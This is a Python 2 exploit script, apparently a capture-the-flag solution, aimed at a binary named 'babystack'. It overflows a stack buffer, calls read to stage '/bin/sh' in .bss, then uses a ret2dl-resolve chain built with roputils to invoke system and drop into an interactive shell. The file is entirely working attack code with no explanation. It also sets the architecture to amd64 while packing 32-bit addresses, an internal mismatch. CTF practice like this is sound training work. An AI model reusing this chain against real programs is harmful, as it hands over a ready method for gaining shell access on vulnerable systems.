#!/usr/bin/env python2
from mypwn import *
from ctypes import *
import sys
import roputils


def pwn(ip=None,port=None):

    binary= 'babystack'
    library='libc.so.6'
    context.arch = 'amd64'
    context.log_level='debug'
    elf = ELF(binary)

    if ip==None and port==None:
        io = getio(binary)
        libc=getlib()
        #io = getio(binary,library)
        #libc = ELF(library)
    else:
        io = remote(HOST, PORT)
        libc = ELF(library)

    ##################################

    def ru(delim):
        return io.recvuntil(delim)

    def rn(count):
        return io.recvn(count)

    def sl(data):
        return io.sendline(data)

    def sn(data):
        return io.send(data)

    def uint32(x):
        return c_uint32(x).value

    def sint32(x):
        return c_int32(x).value

    def info(comment,addr):
        print '#### log #####'
        log.info(comment+':%#x',addr)

    ##################################

    #p=cyclic(0x40)
    #sn(p)
    eip='laaa'

    offset = cyclic_find(eip) #cyclic_find('baaacaaa', n=8)
    info('offset',offset)

    #ret2elf
    leave_ret=0x8048455
    bof=0x0804843b
    arg_addr=elf.bss()
    func_addr=arg_addr+20

    p1='a'*offset+p32(elf.symbols['read'])+p32(bof)+p32(0)+p32(arg_addr)+p32(100)
    info('p1 len',len(p1))
    assert len(p1)==0x40

    sn(p1)

    # ret2dl
    # save data to bss

    rop = roputils.ROP(binary)
    buf = rop.string('/bin/sh')
    buf += rop.fill(20, buf)
    buf += rop.dl_resolve_data(func_addr, 'system')
    buf += rop.fill(100, buf)
    sn(buf)

    # call
    p2='a'*offset+ rop.dl_resolve_call(func_addr, arg_addr)
    sn(p2)
    io.interactive()

if __name__=="__main__":
    pwn()

